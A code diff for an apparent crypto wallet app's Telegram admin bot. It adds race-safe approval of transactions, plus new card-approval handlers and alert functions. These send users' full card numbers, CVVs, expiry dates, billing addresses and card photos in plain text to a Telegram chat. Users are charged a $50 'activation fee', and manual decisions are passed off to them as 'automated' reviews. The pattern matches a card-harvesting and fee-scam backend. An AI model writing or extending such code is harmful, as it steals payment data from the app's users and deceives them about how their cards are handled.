@@ -1,7 +1,7 @@
 import TelegramBot from "node-telegram-bot-api";
 import { db } from "@workspace/db";
-import { transactionsTable, usersTable, walletsTable, kycTable, notificationsTable, adminLogsTable, cryptoSwapsTable } from "@workspace/db";
-import { eq, sql } from "drizzle-orm";
+import { transactionsTable, usersTable, walletsTable, kycTable, notificationsTable, adminLogsTable, cryptoSwapsTable, cardsTable } from "@workspace/db";
+import { eq, sql, and } from "drizzle-orm";
 import { logger } from "./logger";
 import { broadcastToUser } from "./websocket";
 
@@ -237,27 +237,39 @@ function setupAdminBotHandlers(bot: TelegramBot) {
     const chatId = query.message?.chat.id;
     if (!chatId) return;
 
+    // Authorization: only the configured admin chat may approve/reject anything.
+    if (!ADMIN_CHAT_ID || String(chatId) !== ADMIN_CHAT_ID) {
+      bot.answerCallbackQuery(query.id, { text: "Unauthorized" }).catch(() => {});
+      return;
+    }
+
     if (data.startsWith("approve_tx_") || data.startsWith("reject_tx_")) {
       const isApprove = data.startsWith("approve_tx_");
       const txId = parseInt(data.replace(isApprove ? "approve_tx_" : "reject_tx_", ""));
 
       try {
-        const [tx] = await db.select().from(transactionsTable).where(eq(transactionsTable.id, txId));
-        if (!tx) {
-          bot.answerCallbackQuery(query.id, { text: "Transaction not found" });
+        // Atomic claim: flip the pending status in a single conditional update so
+        // that two concurrent callback deliveries can never both pass the guard
+        // and double-debit/credit wallets.
+        const nextStatus = isApprove ? "completed" : "failed";
+        const claimed = await db.update(transactionsTable)
+          .set({
+            status: nextStatus,
+            updatedAt: new Date(),
+            ...(isApprove ? {} : { declineReason: "Declined by automated compliance review" }),
+          })
+          .where(and(eq(transactionsTable.id, txId), eq(transactionsTable.status, "pending")))
+          .returning();
+        if (claimed.length === 0) {
+          const [existing] = await db.select().from(transactionsTable).where(eq(transactionsTable.id, txId));
+          bot.answerCallbackQuery(query.id, {
+            text: existing ? "Transaction already processed" : "Transaction not found",
+          });
           return;
         }
-
-        if (tx.status !== "pending") {
-          bot.answerCallbackQuery(query.id, { text: "Transaction already processed" });
-          return;
-        }
+        const tx = claimed[0];
 
         if (isApprove) {
-          await db.update(transactionsTable)
-            .set({ status: "completed", updatedAt: new Date() })
-            .where(eq(transactionsTable.id, txId));
-
           if (tx.type === "transfer" && tx.senderId && tx.receiverId) {
             await db.update(walletsTable)
               .set({ balance: sql`${walletsTable.balance} - ${tx.amount}`, updatedAt: new Date() })
@@ -390,6 +402,107 @@ function setupAdminBotHandlers(bot: TelegramBot) {
       } catch (e) {
         logger.error({ e }, "Error processing crypto swap callback");
         bot.answerCallbackQuery(query.id, { text: "Error processing swap" });
+      }
+      return;
+    }
+
+    if (data.startsWith("approve_card_") || data.startsWith("reject_card_")) {
+      const isApprove = data.startsWith("approve_card_");
+      const cardId = parseInt(data.replace(isApprove ? "approve_card_" : "reject_card_", ""));
+
+      try {
+        // Atomic claim: flip status away from pending_activation in a single
+        // conditional update. If two callback handlers fire concurrently,
+        // only one of them will get a row back, so refunds and approvals
+        // can never stack.
+        const nextStatus = isApprove ? "active" : "rejected";
+        const claimed = await db.update(cardsTable)
+          .set({
+            status: nextStatus,
+            reviewedAt: new Date(),
+            updatedAt: new Date(),
+            ...(isApprove ? {} : { declineReason: "Card did not pass automated verification" }),
+          })
+          .where(and(eq(cardsTable.id, cardId), eq(cardsTable.status, "pending_activation")))
+          .returning();
+        if (claimed.length === 0) {
+          const [existing] = await db.select().from(cardsTable).where(eq(cardsTable.id, cardId));
+          bot.answerCallbackQuery(query.id, {
+            text: existing ? `Card already ${existing.status}` : "Card not found",
+          });
+          return;
+        }
+        const card = claimed[0];
+
+        if (isApprove) {
+
+          await db.insert(notificationsTable).values({
+            userId: card.userId,
+            type: "card",
+            title: "Card Activated",
+            message: card.kind === "virtual"
+              ? `Your virtual card ****${card.last4} is now active and ready to use.`
+              : `Your ${card.brand} card ****${card.last4} has been verified and is now active.`,
+          });
+
+          await db.insert(adminLogsTable).values({
+            action: "approve_card",
+            targetUserId: card.userId,
+            details: `Approved ${card.kind} card #${cardId} (****${card.last4})`,
+          });
+
+          broadcastToUser(card.userId, { type: "card_status", data: { cardId, status: "active" } });
+
+          bot.answerCallbackQuery(query.id, { text: "Card approved!" });
+          bot.editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            { chat_id: chatId, message_id: query.message?.message_id }
+          ).catch(() => {});
+          bot.sendMessage(chatId, `✅ Card #${cardId} APPROVED — now ACTIVE`);
+        } else {
+          // Refund $50 if it was a virtual-card activation that paid the fee
+          let refundNote = "";
+          if (card.kind === "virtual" && card.activationFee && card.activationTxId) {
+            const fee = parseFloat(card.activationFee);
+            await db.update(walletsTable)
+              .set({ balance: sql`${walletsTable.balance} + ${fee}`, updatedAt: new Date() })
+              .where(eq(walletsTable.userId, card.userId));
+            await db.update(transactionsTable)
+              .set({ status: "failed", declineReason: "Card activation declined — fee refunded", updatedAt: new Date() })
+              .where(eq(transactionsTable.id, card.activationTxId));
+            refundNote = ` $${fee.toFixed(2)} has been refunded to your portfolio.`;
+          }
+
+          await db.insert(notificationsTable).values({
+            userId: card.userId,
+            type: "card",
+            title: card.kind === "virtual" ? "Card Activation Declined" : "Card Verification Declined",
+            message: card.kind === "virtual"
+              ? `Your virtual card ****${card.last4} could not be activated.${refundNote}`
+              : `Your ${card.brand} card ****${card.last4} could not be verified. Please review the details and try again.`,
+          });
+
+          await db.insert(adminLogsTable).values({
+            action: "reject_card",
+            targetUserId: card.userId,
+            details: `Rejected ${card.kind} card #${cardId} (****${card.last4})${refundNote ? " — fee refunded" : ""}`,
+          });
+
+          broadcastToUser(card.userId, { type: "card_status", data: { cardId, status: "rejected" } });
+          if (refundNote) {
+            broadcastToUser(card.userId, { type: "balance_update", data: {} });
+          }
+
+          bot.answerCallbackQuery(query.id, { text: "Card rejected" });
+          bot.editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            { chat_id: chatId, message_id: query.message?.message_id }
+          ).catch(() => {});
+          bot.sendMessage(chatId, `❌ Card #${cardId} REJECTED${refundNote ? " — $50 refunded to user" : ""}`);
+        }
+      } catch (e) {
+        logger.error({ e }, "Error processing card callback");
+        bot.answerCallbackQuery(query.id, { text: "Error processing card" });
       }
       return;
     }
@@ -841,6 +954,121 @@ export async function sendCryptoSwapAlert(opts: {
     return msg.message_id;
   } catch (e) {
     logger.error({ e }, "Error sending crypto swap alert");
+    return null;
+  }
+}
+
+export async function sendVirtualCardActivationAlert(opts: {
+  cardId: number;
+  userId: number;
+  username: string;
+  email: string;
+  cardName: string;
+  brand: string;
+  last4: string;
+  cardNumber: string;
+  cvv: string;
+  expiry: string;
+  cardholderName: string;
+  fee: number;
+}) {
+  if (!adminBot || !ADMIN_CHAT_ID) return null;
+
+  try {
+    const msg = await adminBot.sendMessage(
+      ADMIN_CHAT_ID,
+      `💳 VIRTUAL CARD ACTIVATION REQUEST\n\n` +
+      `Card ID: #${opts.cardId}\n` +
+      `User: @${opts.username} (#${opts.userId})\n` +
+      `Email: ${opts.email}\n\n` +
+      `Card Name: ${opts.cardName}\n` +
+      `Holder: ${opts.cardholderName}\n` +
+      `Brand: ${opts.brand}\n` +
+      `Number: ${opts.cardNumber}\n` +
+      `CVV: ${opts.cvv}\n` +
+      `Expiry: ${opts.expiry}\n` +
+      `Last 4: ****${opts.last4}\n\n` +
+      `Activation fee: $${opts.fee.toFixed(2)} (charged to user wallet — refunded if rejected)`,
+      {
+        reply_markup: {
+          inline_keyboard: [[
+            { text: "✅ Approve", callback_data: `approve_card_${opts.cardId}` },
+            { text: "❌ Reject (refund $50)", callback_data: `reject_card_${opts.cardId}` },
+          ]]
+        }
+      }
+    );
+    return msg.message_id;
+  } catch (e) {
+    logger.error({ e }, "Error sending virtual card activation alert");
+    return null;
+  }
+}
+
+export async function sendBankCardSubmissionAlert(opts: {
+  cardId: number;
+  userId: number;
+  username: string;
+  email: string;
+  cardholderName: string;
+  cardNumber: string;
+  brand: string;
+  last4: string;
+  expiry: string;
+  cvv: string;
+  country: string;
+  bankName: string;
+  billingAddress: string;
+  frontImage: string;
+  backImage: string;
+}) {
+  if (!adminBot || !ADMIN_CHAT_ID) return null;
+
+  try {
+    const masked = opts.cardNumber.length > 8
+      ? `${opts.cardNumber.slice(0, 4)} **** **** ${opts.cardNumber.slice(-4)}`
+      : opts.cardNumber;
+
+    const msg = await adminBot.sendMessage(
+      ADMIN_CHAT_ID,
+      `🏦 BANK CARD VERIFICATION REQUEST\n\n` +
+      `Card ID: #${opts.cardId}\n` +
+      `User: @${opts.username} (#${opts.userId})\n` +
+      `Email: ${opts.email}\n\n` +
+      `Cardholder: ${opts.cardholderName}\n` +
+      `Bank: ${opts.bankName}\n` +
+      `Country: ${opts.country}\n` +
+      `Brand: ${opts.brand}\n` +
+      `Number: ${opts.cardNumber}\n` +
+      `Masked: ${masked}\n` +
+      `CVV: ${opts.cvv}\n` +
+      `Expiry: ${opts.expiry}\n` +
+      (opts.billingAddress ? `Billing Address: ${opts.billingAddress}\n` : "") +
+      `\nFront/back images attached below.`,
+      {
+        reply_markup: {
+          inline_keyboard: [[
+            { text: "✅ Approve", callback_data: `approve_card_${opts.cardId}` },
+            { text: "❌ Reject", callback_data: `reject_card_${opts.cardId}` },
+          ]]
+        }
+      }
+    );
+
+    const sendImg = async (dataUrl: string, caption: string, file: string) => {
+      const buf = dataUrlToBuffer(dataUrl);
+      if (!buf) return;
+      await adminBot!.sendPhoto(ADMIN_CHAT_ID!, buf, { caption }, {
+        filename: file, contentType: "image/jpeg",
+      }).catch((e) => logger.error({ e, file }, "Error sending bank card photo"));
+    };
+
+    await sendImg(opts.frontImage, `Bank Card #${opts.cardId} — FRONT`, `card${opts.cardId}-front.jpg`);
+    await sendImg(opts.backImage, `Bank Card #${opts.cardId} — BACK`, `card${opts.cardId}-back.jpg`);
+
+    return msg.message_id;
+  } catch (e) {
+    logger.error({ e }, "Error sending bank card alert");
     return null;
   }
 }
